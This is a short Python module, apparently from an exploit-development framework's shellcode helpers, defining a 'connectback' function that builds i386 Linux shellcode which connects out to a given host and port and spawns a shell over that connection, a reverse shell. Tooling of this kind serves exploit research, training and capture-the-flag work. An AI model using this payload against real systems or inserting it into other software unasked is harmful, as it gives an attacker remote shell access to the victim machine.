from pwn.shellcode_helper import *
from connect import connect
from .. import dupsh

@shellcode_reqs(arch='i386', os='linux', network='ipv4')
def connectback(host, port):
    """Args: host, port
    Standard connect back type shellcode."""
    return \
        connect(host, port) + \
        dupsh()
